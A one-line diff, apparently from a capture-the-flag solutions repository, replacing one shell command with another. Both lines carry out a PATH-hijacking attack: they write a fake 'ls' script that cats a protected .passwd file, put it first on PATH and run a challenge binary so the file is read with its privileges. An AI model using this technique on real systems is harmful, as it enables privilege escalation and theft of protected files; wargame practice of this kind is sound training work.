@@ -1,1 +1,1 @@
-mkdir /tmp/ch12 && echo "/bin/cat /challenge/app-script/ch12/.passwd" > /tmp/ch12/ls && chmod 777 /tmp/ch12/ls && export PATH=/tmp/ch12 && ./ch12
+echo "/bin/cat ~/.passwd" > /tmp/ls && export PATH=/tmp && ./ch11
